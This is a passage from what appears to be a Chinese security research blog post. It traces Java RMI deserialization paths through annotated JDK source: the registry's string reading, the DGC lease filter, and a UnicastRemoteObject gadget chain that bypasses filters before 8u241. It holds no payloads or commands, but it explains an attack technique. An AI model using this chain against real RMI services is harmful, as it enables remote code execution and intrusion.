sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:<span class="number">800</span>)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$<span class="number">0</span>(TCPTransport.java:<span class="number">682</span>)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$<span class="number">36.2071178362</span>.run(Unknown Source:-<span class="number">1</span>)</span><br><span class="line">at java.security.AccessController.doPrivileged(AccessController.java:-<span class="number">1</span>)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:<span class="number">681</span>)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:<span class="number">1167</span>)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:<span class="number">641</span>)</span><br><span class="line">at java.lang.Thread.run(Thread.java:<span class="number">844</span>)</span><br></pre></td></tr></table></figure></div>

<p>注意这里因为 <code>RegistryImpl_Skel.dispatch</code> 是通过 <code>readObject</code> 反序列化字符串对象，然后再强转成字符串。因此这里支持我们传入任意对象触发反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.String s;</span><br><span class="line"><span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line">s = (java.lang.String) in.readObject();   <span class="comment">// 先反序列化“一个对象”，再强转为 String</span></span><br></pre></td></tr></table></figure></div>

<p>然而<strong>高版本</strong>把它改成了只读“字符串标签”的内部 API：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> (ObjectInputStream) call.getInputStream();</span><br><span class="line">s = SharedSecrets.getJavaObjectInputStreamReadString().readString(in);</span><br></pre></td></tr></table></figure></div>

<p>这个 <code>readString</code> 只接受 <strong><code>TC_STRING/TC_LONGSTRING</code>（或对已有字符串的引用）</strong>。如果来的是 <code>TC_OBJECT</code> 等非字符串标记，<strong>不会去构造任意对象</strong>，而是直接异常（代码里还会 <code>discardPendingRefs()</code> 清理）。因此**不会进入攻击者对象的 <code>readObject</code>&#x2F;<code>readResolve</code>&#x2F;<code>readExternal</code>**。</p>
<h5 id="UnicastRemoteObject-反序列化（8u241-前）"><a href="#UnicastRemoteObject-反序列化（8u241-前）" class="headerlink" title="UnicastRemoteObject 反序列化（8u241 前）"></a>UnicastRemoteObject 反序列化（8u241 前）</h5><p><code>JDK 8u231</code> 修复了 <code>DGCImpl_Stub</code>，在 <code>clean</code> 和 <code>dirty</code> 的反序列化前设置了过滤器 <code>DGCImpl_Stub::leaseFilter</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// implementation of dirty(ObjID[], long, Lease)</span></span><br><span class="line"><span class="keyword">public</span> java.rmi.dgc.Lease <span class="title function_">dirty</span><span class="params">(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, <span class="type">long</span> $param_long_2, java.rmi.dgc.Lease $param_Lease_3)</span></span><br><span class="line">        <span class="keyword">throws</span> java.rmi.RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">call</span> <span class="operator">=</span></span><br><span class="line">                (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject) <span class="built_in">this</span>,</span><br><span class="line">                        operations, <span class="number">1</span>, interfaceHash);</span><br><span class="line">        call.setObjectInputFilter(DGCImpl_Stub::leaseFilter); <span class="comment">// 🚨 新增过滤器</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">            out.writeObject($param_arrayOf_ObjID_1);</span><br><span class="line">            out.writeLong($param_long_2);</span><br><span class="line">            out.writeObject($param_Lease_3);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        ref.invoke(call);</span><br></pre></td></tr></table></figure></div>

<p><code>DGCImpl_Stub::leaseFilter</code> 实现如下，总之高版本无法通过 DGC 欺骗的方式进行反序列化利用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ObjectInputFilter：用于过滤 DGCClient 的返回值（一个 Lease 对象）。</span></span><br><span class="line"><span class="comment"> * 允许的类型集合非常有限且显式；同时限制对象嵌套深度与数组长度。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 重要：过滤器既要允许“正常返回”，也要允许“异常返回”。</span></span><br><span class="line"><span class="comment"> * DGC 服务端可能会抛异常，并且异常可能包含 cause 与 suppressed 异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filterInfo 访问正在反序列化对象的信息（类、数组长度、当前深度等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  允许返回 &#123;<span class="doctag">@link</span> ObjectInputFilter.Status#ALLOWED&#125;，</span></span><br><span class="line"><span class="comment"> *          拒绝返回 &#123;<span class="doctag">@link</span> ObjectInputFilter.Status#REJECTED&#125;，</span></span><br><span class="line"><span class="comment"> *          否则返回 &#123;<span class="doctag">@link</span> ObjectInputFilter.Status#UNDECIDED&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ObjectInputFilter.Status <span class="title function_">leaseFilter</span><span class="params">(ObjectInputFilter.FilterInfo filterInfo)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若对象图嵌套深度超过上限，则拒绝（防止构造深层嵌套触发资源消耗）</span></span><br><span class="line">    <span class="keyword">if</span> (filterInfo.depth() &gt; DGCCLIENT_MAX_DEPTH) &#123;</span><br><span class="line">        <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前要反序列化的“声明类”（可能为数组/非数组；也可能为 null，如流中的非对象片段）</span></span><br><span class="line">    Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 若是数组类型，则逐层剥离到元素类型，同时检查数组长度上限</span></span><br><span class="line">        <span class="keyword">while</span> (clazz.isArray()) &#123;</span><br><span class="line">            <span class="comment">// 限制数组长度（&gt;=0 表示流中给出了具体长度）</span></span><br><span class="line">            <span class="keyword">if</span> (filterInfo.arrayLength() &gt;= <span class="number">0</span> &amp;&amp; filterInfo.arrayLength() &gt; DGCCLIENT_MAX_ARRAY_SIZE) &#123;</span><br><span class="line">                <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 继续下钻到组件类型（直到拿到最终元素类型）</span></span><br><span class="line">            clazz = clazz.getComponentType();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 基本类型（或基本类型数组在上面的循环里已剥到基本类型）直接允许</span></span><br><span class="line">        <span class="keyword">if</span> (clazz.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 白名单判断：</span></span><br><span class="line">        <span class="comment">// 仅允许：</span></span><br><span class="line">        <span class="comment">//  - UID / VMID / Lease（DGC 相关的数据类型）</span></span><br><span class="line">        <span class="comment">//  - Throwable 及其子类，但必须是由引导类加载器加载（== Object 的 classloader，一般为 null），防止自定义异常类型</span></span><br><span class="line">        <span class="comment">//  - StackTraceElement（异常栈元素）</span></span><br><span class="line">        <span class="comment">//  - ArrayList（用于承载 suppressed 异常列表）</span></span><br><span class="line">        <span class="comment">//  - Object（某些返回路径可能声明为 Object）</span></span><br><span class="line">        <span class="comment">//  - java.util.Collections 的不可变集合视图（Unmodifiable*）</span></span><br><span class="line">        <span class="keyword">return</span> (clazz == UID.class ||</span><br><span class="line">                clazz == VMID.class ||</span><br><span class="line">                clazz == Lease.class ||</span><br><span class="line">                (Throwable.class.isAssignableFrom(clazz) &amp;&amp;</span><br><span class="line">                        <span class="comment">// 仅接受“JDK 自带”的异常类型（引导类加载器加载）</span></span><br><span class="line">                        clazz.getClassLoader() == Object.class.getClassLoader()) ||</span><br><span class="line">                clazz == StackTraceElement.class ||</span><br><span class="line">                clazz == ArrayList.class ||     <span class="comment">// suppressed 异常列表的常见实现</span></span><br><span class="line">                clazz == Object.class ||</span><br><span class="line">                clazz.getName().equals(<span class="string">&quot;java.util.Collections$UnmodifiableList&quot;</span>) ||</span><br><span class="line">                clazz.getName().equals(<span class="string">&quot;java.util.Collections$UnmodifiableCollection&quot;</span>) ||</span><br><span class="line">                clazz.getName().equals(<span class="string">&quot;java.util.Collections$UnmodifiableRandomAccessList&quot;</span>))</span><br><span class="line">                ? ObjectInputFilter.Status.ALLOWED</span><br><span class="line">                : ObjectInputFilter.Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// clazz 为 null：当前片段不是一个具体类（如流控制信息等），不做判断，交由后续/外层过滤器决定</span></span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.UNDECIDED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>国外安全研究人员 <code>@An Trinhs</code> 发现了一个 <code>gadgets</code> 利用链，能够直接反序列化 <code>UnicastRemoteObject</code> 造成反序列化漏洞。</p>
<p>当我们反序列化 <code>UnicastRemoteObject</code> 这个类时，由于该类重写了 <code>readObject</code> 方法，所以在反序列化的时候会调用到他的 <code>reexport</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 反序列化钩子（UnicastRemoteObject → RemoteServer）：</span></span><br><span class="line"><span class="comment"> * 当 UnicastRemoteObject 实例从输入流中被反序列化时，立刻将其“重新导出”（re-export），</span></span><br><span class="line"><span class="comment"> * 使该对象在当前 JVM 中再次成为可远程调用的 RMI 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 工作流程：</span></span><br><span class="line"><span class="comment"> * 1) defaultReadObject()：恢复对象的非 transient 字段（如端口、客户端/服务端 SocketFactory 等）。</span></span><br><span class="line"><span class="comment"> * 2) reexport()：依据已恢复的配置将对象绑定到 RMI 传输层（创建/注册监听、参与 DGC 等），</span></span><br><span class="line"><span class="comment"> *    让该实例重新具备远程可达性。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 该方法由 Java 反序列化机制自动回调，应用代码不需要显式调用。</span></span><br><span class="line"><span class="comment"> * - 出于安全考虑，应结合 ObjectInputFilter 等机制限制可反序列化的数据与类型，</span></span><br><span class="line"><span class="comment"> *   防止在 reexport() 过程中因恶意配置触发意外的网络副作用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 恢复对象状态（与 writeObject/defaultWriteObject 对应）</span></span><br><span class="line">    in.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基于恢复后的字段重新导出到 RMI 运行时，使其再次可被远程访问</span></span><br><span class="line">    reexport(); <span class="comment">// 👈</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>reexport</code> 方法里，如果 <code>ssf</code> 是被我们设置了值，那么进入 <code>else</code> 判断：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 重新导出（re-export）该 UnicastRemoteObject。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 背景：</span></span><br><span class="line"><span class="comment"> * - 当对象通过“反序列化 / 克隆”等方式创建时，并不会执行构造函数；</span></span><br><span class="line"><span class="comment"> *   此时需要依赖已恢复的字段（port、csf、ssf）把对象再次导出到 RMI 运行时，</span></span><br><span class="line"><span class="comment"> *   使其重新具备远程可达性（生成/更新 stub、注册 DGC、开始监听等）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 行为：</span></span><br><span class="line"><span class="comment"> * - 若未指定自定义套接字工厂（csf/ssf 均为 null），使用默认传输层导出；</span></span><br><span class="line"><span class="comment"> * - 否则，使用指定的客户端/服务端 SocketFactory 导出，影响连接的创建方式</span></span><br><span class="line"><span class="comment"> *   （如自定义握手、代理/隧道、绑定网卡/端口等）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * - 若对象已被导出，重复导出可能抛出 ExportException。</span></span><br><span class="line"><span class="comment"> * - 自定义 RMIServerSocketFactory（ssf）/RMIClientSocketFactory（csf）会改变网络行为，</span></span><br><span class="line"><span class="comment"> *   在受限/生产环境下应结合反序列化过滤与最小权限策略审慎使用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reexport</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">if</span> (csf == <span class="literal">null</span> &amp;&amp; ssf == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 使用默认传输层导出：在指定 port 上监听并注册到 RMI 运行时</span></span><br><span class="line">        exportObject((Remote) <span class="built_in">this</span>, port);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 使用自定义的客户端/服务端 SocketFactory 导出</span></span><br><span class="line">        exportObject((Remote) <span class="built_in">this</span>, port, csf, ssf); <span class="comment">// 👈</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着调用 <code>exportObject</code> 方法，该方法通常用来导出远程对象。和前面远程对象导出的过程一致。</p>
<p><code>TCPTransoprt#exportObject</code> 调用 <code>listen</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 导出对象，使其能够接受来自远程的调用。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 工作流程：</span></span><br><span class="line"><span class="comment"> * 1) 首先，确保服务器套接字（Server Socket）正在监听远程连接请求，同时**通过同步**避免由于并发 `unexport` 操作导致套接字被关闭。</span></span><br><span class="line"><span class="comment"> * 2) 然后尝试将目标对象（Target）添加到已导出的对象表中，并保持**继续计数**，确保服务器套接字不会被关闭，直到所有导出计数完成。</span></span><br><span class="line"><span class="comment"> * 3) 如果成功，将目标对象（Target）正式导出并能够处理远程方法调用。</span></span><br><span class="line"><span class="comment"> * 4) 如果导出失败，通过同步机制**减少导出计数**，确保资源管理不出现泄漏。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * - `listen()` 方法会开启服务器端口并监听来自远端的连接。</span></span><br><span class="line"><span class="comment"> * - `exportCount` 用来追踪当前对象的导出次数，防止套接字在进行并发 `unexport` 时被意外关闭。</span></span><br><span class="line"><span class="comment"> * - `super.exportObject(target)` 是父类方法调用，负责将对象注册到远程对象表。</span></span><br><span class="line"><span class="comment"> * - 采用**同步机制**来确保线程安全，避免由于多个导出/撤销操作并发执行时导致资源冲突。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 确保服务器套接字正在监听，并增加导出计数</span></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        listen(); <span class="comment">// 👈</span></span><br><span class="line">        exportCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试将目标对象（Target）添加到已导出对象表</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 调用父类的 exportObject 方法，正式导出对象</span></span><br><span class="line">        <span class="built_in">super</span>.exportObject(target);</span><br><span class="line">        ok = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 如果导出失败，减少导出计数</span></span><br><span class="line">        <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                decrementExportCount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>继续跟进 <code>listen</code> 方法，跟进 <code>TCPEndpoint#newServerSocket</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在该传输（TCP）端点上开始监听进入的连接。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 断言当前线程已持有 this 的锁，保证在受控的同步环境中调用</span></span><br><span class="line">    <span class="keyword">assert</span> Thread.holdsLock(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">ep</span> <span class="operator">=</span> getEndpoint();   <span class="comment">// 获取当前传输对应的 TCP 端点（地址/端口/工厂等）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> ep.getPort();          <span class="comment">// 取出监听端口</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (server == <span class="literal">null</span>) &#123;             <span class="comment">// 若尚未创建 ServerSocket，则进行初始化</span></span><br><span class="line">        <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            tcpLog.log(Log.BRIEF, <span class="string">&quot;(port &quot;</span> + port + <span class="string">&quot;) create server socket&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 基于端点创建实际的 ServerSocket（可能走自定义的 SocketFactory）</span></span><br><span class="line">            server = ep.newServerSocket();  <span class="comment">// 👈</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 如果创建失败，不要重试：</span></span><br><span class="line"><span class="comment">             * 常见错误如“端口被占用”会导致导出(export)过程卡死，</span></span><br><span class="line"><span class="comment">             * 除非安装了 RMIFailureHandler 来接管失败情况。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 以特权操作创建并启动一个守护线程，负责 accept() 新连接</span></span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AcceptLoop</span>(server),  <span class="comment">// 连接接受循环</span></span><br><span class="line">                    <span class="string">&quot;TCP Accept-&quot;</span> + port,    <span class="comment">// 线程名</span></span><br><span class="line">                    <span class="literal">true</span>                     <span class="comment">// true = 守护线程</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">            t.start(); <span class="comment">// 开始在后台接受连接</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.net.BindException e) &#123;</span><br><span class="line">            <span class="comment">// 端口已被占用，包装为导出异常抛出</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Port already in use: &quot;</span> + port, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// 其他 I/O 错误导致监听失败</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Listen failed on port: &quot;</span> + port, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果已存在 ServerSocket，则进行安全检查是否允许在该端口监听</span></span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">            sm.checkListen(port);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>TCPEndpoint#newServerSocket</code> 方法中，如果我们把 <code>ssf</code> 设置为通过 <code>RemoteObjectInvocationHandler</code> 生成的代理类，那么就会调用到 <code>RemoteObjectInvocationHandler#invoke</code> 方法，<strong>从而发起一次远程调用</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回一个新的 ServerSocket，用于在该端点上监听进入的连接。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ServerSocket <span class="title function_">newServerSocket</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 若日志级别为 VERBOSE，则记录创建 ServerSocket 的调试信息</span></span><br><span class="line">    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        TCPTransport.tcpLog.log(Log.VERBOSE,</span><br><span class="line">            <span class="string">&quot;creating server socket on &quot;</span> + <span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">RMIServerSocketFactory</span> <span class="variable">serverFactory</span> <span class="operator">=</span> ssf; <span class="comment">// 优先使用已配置的自定义 ServerSocket 工厂</span></span><br><span class="line">    <span class="keyword">if</span> (serverFactory == <span class="literal">null</span>) &#123;</span><br><span class="line">        serverFactory = chooseFactory();         <span class="comment">// 若未指定，按策略选择（默认/SSL/通道等）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用工厂创建监听套接字；listenPort 可能为 0（匿名端口，交由系统分配）</span></span><br><span class="line">    <span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> serverFactory.createServerSocket(listenPort); <span class="comment">// 👈</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果是匿名端口，则将实际分配到的端口记录为“默认端口”</span></span><br><span class="line">    <span class="comment">// （针对这对 socket factory：csf/ssf），便于后续复用</span></span><br><span class="line">    <span class="keyword">if</span> (listenPort == <span class="number">0</span>)</span><br><span class="line">        setDefaultPort(server.getLocalPort(), csf, ssf);</span><br><span 